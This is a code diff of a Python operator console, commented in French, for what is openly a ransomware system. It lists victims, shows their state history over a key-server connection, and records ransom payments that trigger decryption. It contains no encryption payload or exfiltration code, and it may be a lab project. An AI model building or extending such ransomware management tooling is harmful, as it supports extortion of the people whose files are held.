@@ -15,7 +15,6 @@ PORT_SERV_CONSOLE = 8381
 def format_timestamp(timestamp):
     # Convertir le timestamp en objet datetime
     dt_object = datetime.fromtimestamp(timestamp)
-
     # Formater la date selon le format souhaité
     formatted_date = dt_object.strftime("%d/%m/%Y %H:%M:%S")
 
@@ -43,11 +42,12 @@ def affichage_liste_victimes():
     s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
     msg = message.set_message("LIST_VICTIM_REQ")
     network.send_message(s, msg)
+    # recevoir la réponse
     response = network.receive_message(s)
     if response is None:
         print("Aucune réponse reçue.")
         return
-    # affiche les données
+    # affiche les données reçues
     while response is not None and message.get_message_type(response) != 'LIST_END':
         data = list(response.values())
         print(
@@ -55,21 +55,25 @@ def affichage_liste_victimes():
         response = network.receive_message(s)
 
 
-def affichage_historique_etat_victimes():
+def affichage_historique_etat_victime():
     print("")
     print("============================================================================")
-    print("HISTORIQUE DES ETATS D'UNE VICTIME")
+    print("HISTORIQUE DES ETATS DE LA VICTIME")
     print("============================================================================")
+    # Connexion au serveur
     s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
+    # Récupération de l'id de la victime
     victim_id = input("Entrez le numéro de la victime : ")
+    # Envoi de la requête
     msg = message.set_message("HISTORY_REQ")
     network.send_message(s, msg)
     network.send_message(s, victim_id)
+    # Récupération de la réponse
     response = network.receive_message(s)
     if response is None:
         print("Aucune réponse reçue.")
         return
-    # affiche les données
+    # Affichage de l'historique
     while response is not None and message.get_message_type(response) != 'HIST_END':
         data = list(response.values())
         print(
@@ -82,17 +86,20 @@ def affichage_payement_rancon():
     print("")
     print("RENSEIGNER LE PAYEMENT DE RANCON D'UNE VICTIME")
     print("______________________________________________")
+    # Connexion au serveur
     s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
+    # Récupération de l'id de la victime
     victim_id = input("Entrez le numéro de la victime : ")
     # Envoi de la requête
     msg = message.set_message("CHANGE_STATE")
     network.send_message(s, msg)
     network.send_message(s, victim_id)
+    # Récupération de la réponse
     response = network.receive_message(s)
     if response is None:
         print("Aucune réponse reçue.")
         return
-    # affiche la réponse
+    # Affichage de la réponse en fonction de l'état de la victime
     chgstate_value = response['CHGSTATE']
     if chgstate_value == "DECRYPT":
         print(f"La victime {victim_id} a payé la rançon. Décryptage en cours...")
@@ -110,17 +117,10 @@ def main():
         if choix_user == "1":
             affichage_liste_victimes()
         elif choix_user == "2":
-            affichage_historique_etat_victimes()
+            affichage_historique_etat_victime()
         elif choix_user == "3":
             affichage_payement_rancon()
         elif choix_user == "4":
-            print("Arrêt du serveur en cours...")
-            # Envoi d'un message spécial au serveur pour lui indiquer de s'arrêter
-            s = network.connect_to_serv(IP_SERV_CONSOLE, PORT_SERV_CONSOLE)
-            msg = message.set_message("STOP_SERVER")
-            network.send_message(s, msg)
-            s.close()
-            print("Serveur arrêté. Au revoir !")
             continuer = False
             print("Au revoir")
         else:
